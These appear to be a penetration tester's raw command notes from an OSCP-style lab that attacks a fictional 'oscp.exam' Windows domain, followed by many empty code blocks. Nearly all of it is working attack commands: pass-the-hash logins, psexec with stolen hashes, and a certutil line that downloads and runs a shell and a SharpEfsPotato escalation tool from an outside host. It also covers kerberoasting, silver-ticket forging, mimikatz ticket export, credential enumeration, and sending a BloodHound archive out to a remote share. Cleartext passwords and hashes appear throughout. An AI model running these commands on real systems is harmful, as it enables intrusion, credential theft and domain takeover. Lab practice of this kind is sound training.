[[Editing Copy Page]]

```
evil-winrm -i 192.168.123.206 -u 'r.andrews' -p 'BusyOfficeWorker890'
```

MS01 administrator evilwinrm login
```
evil-winrm -i 192.168.123.206 -u 'Administrator' -H '2a00a0a55d5a916e79c91ad30e770715'
```

MS01 nt authority psexec login
```
impacket-psexec SRV22.oscp.exam/Administrator@192.168.123.206 -hashes aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
```


```
powershell -ep bypass; cd C:\Windows\Tasks; certutil -urlcache -split -f http://192.168.49.123/shell.exe shell.exe; certutil -urlcache -split -f http://192.168.49.123/SharpEfsPotato.exe SharpEfsPotato.exe; ./SharpEfsPotato.exe -p shell.exe
```



```
aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
```

```
curl -skD- -o /dev/null https://192.168.123.110:9200/
```

NTLM hash of qazwsx

152EFBCFAFEB22EABDA8FC5E68697A41

Domain SID
S-1-5-21-2052306614-2669946985-1233657417

SPN
MSSQLSvc/SRV22.OSCP.EXAM

```
impacket-mssqlclient -debug -k -no-pass -windows-auth SRV22.OSCP.EXAM/Administrator@DC20.OSCP.EXAM
```

impacket-lookupsid oscp.exam/svc_mssql:qazwsx@172.16.123.200

impacket-GetUserSPNs oscp.exam/r.andrews:BusyOfficeWorker890@172.16.123.200

```
impacket-ticketer -nthash 152EFBCFAFEB22EABDA8FC5E68697A41 -domain-sid S-1-5-21-2052306614-2669946985-1233657417 -domain DC20.OSCP.EXAM -spn MSSQLSvc/SRV22.OSCP.EXAM -user-id 500 Administrator
```

```
http://192.168.123.110:5601/status
```

```
impacket-mssqlclient OSCP.EXAM\svc_mssql:qazwsx@172.16.123.202 -windows-auth
```

.\seatbelt.exe CredEnum DpapiMasterKeys RDCManFiles RDPSavedConnections WindowsCredentialFiles WindowsVault TokenGroups LogonSessions AutoRuns ScheduledTasks Services LocalGroups TokenPrivileges InterestingFiles -outputfile=seatbelt.txt

```
impacket-GetUserSPNs -request -dc-ip 172.16.123.200 SRV22.OSCP.EXAM/svc_mssql
```

```
impacket-getTGT 'DC20.oscp.exam/svc_mssql:qazwsx' -dc-ip 172.16.123.200
```

```
nxc smb 172.16.123.202 -u svc_mssql -p 'qazwsx' --sessions
```

```
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

```
copy 20261126073219_BloodHound.zip \\192.168.49.123\share\
```

```
impacket-mssqlclient oscp.exam/svc_mssql@172.16.123.202 -windows-auth
```

```
netexec smb DC20.oscp.exam -u 'svc_mssql' -p 'qazwsx' -k --generate-krb5-file krb5.conf
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```